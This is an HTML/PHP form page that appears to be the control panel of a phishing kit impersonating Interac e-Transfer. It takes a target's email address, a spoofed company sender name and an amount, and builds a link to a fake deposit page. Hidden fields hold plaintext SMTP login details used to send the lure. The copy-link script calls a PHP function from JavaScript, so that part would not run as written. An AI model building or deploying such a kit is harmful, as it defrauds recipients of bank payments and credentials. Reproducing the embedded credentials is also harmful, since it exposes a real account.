<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="MobileOptimized" content="width">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=yes">
    <style>
        body {
            background-color: red;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            font-size: 24px;
        }
        input[type="text"],
        select {
            background-color: red;
            width: 100%;
            color: white;
            padding: 15px 10px;
            margin-bottom: 10px;
            border: 10px solid #ccc;
            border-radius: 4px;
            font-size: 24px;
        }
        input[type="submit"] {
            background-color: red;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <center>
        <form action="generate_url.php" method="POST" enctype="multipart/form-data">
            <input type="hidden" id="etransfer_interac_ca" name="etransfer_interac_ca" required>
            <label for="receivers_email">LEVEL 1<BR></label>
            <input type="text" id="receivers_email" name="receivers_email" placeholder="Target@email.com" required>
            <input type="hidden" id="receivers_name" name="receivers_name" value="One-time contact" required>
            <input type="text" id="sender_name" name="sender_name" value="SUN HILLS HOLDINGS LTD." required>
            <select id="amount" name="amount" required>
                <!-- Loop through values from 10 to 10000 with a step of 5 -->
                <?php for ($value = 10; $value <= 10000; $value += 5): ?>
                    <option value="<?php echo number_format($value, 2); ?>">
                        <?php echo number_format($value, 2); ?>
                    </option>
                <?php endfor; ?>
            </select>
            <input type="hidden" name="line" value="<?php echo $line; ?>" required="">
            <input type="text" id="memo" name="memo" value="Password is blue " required>
            <input type="hidden" name="port" value="587" required="">
            <input type="hidden" name="username" value="andallard@mymts.net" required="">
            <input type="hidden" name="password" value="Batman123" required="">
            <input type="hidden" name="host" value="mail.mymts.net" required="">
            <input type="submit" value="Copy URL" onclick="copyURL()">
            <button type="submit" name="send_email">Send Etransfer</button>
        </form>
    </center>

    <script>
        function copyURL() {
            // You can use JavaScript to copy the URL to the clipboard here.
            // You may use document.execCommand('copy') or other clipboard libraries.
            // Example:
            var url = window.location.href.split('?')[0] + '/public/deposit/indexx.php?' + http_build_query({
                sender_name: document.getElementById('sender_name').value,
                amount: document.getElementById('amount').value
            });
            copyTextToClipboard(url);
        }

        function copyTextToClipboard(text) {
            var textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand('copy');
            document.body.removeChild(textArea);
        }
    </script>
</body>
</html>
